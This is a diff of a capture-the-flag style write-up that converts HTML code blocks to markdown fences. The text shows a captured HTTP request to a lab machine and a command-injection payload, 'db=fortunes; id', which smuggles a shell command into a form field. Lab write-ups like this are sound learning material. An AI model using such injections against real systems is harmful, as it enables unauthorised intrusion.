@@ -84,7 +84,7 @@ Hmm...
 
 Let's try capturing a request with `Burp Suite!`
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+```
 POST /select HTTP/1.1
 Host: 10.10.10.127
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -99,13 +99,14 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 
 db=fortunes
-</code></pre></div></div>
+```
 
 The `db` variable looks pretty spicy! 🌶️
 
 After running `wfuzz`, I discovered I could append a semi colon (;) and execute commands on the box, like so:
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /select HTTP/1.1
+```
+POST /select HTTP/1.1
 Host: 10.10.10.127
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -119,7 +120,7 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 
 db=fortunes; id
-</code></pre></div></div>
+```
 
 And the response:
 
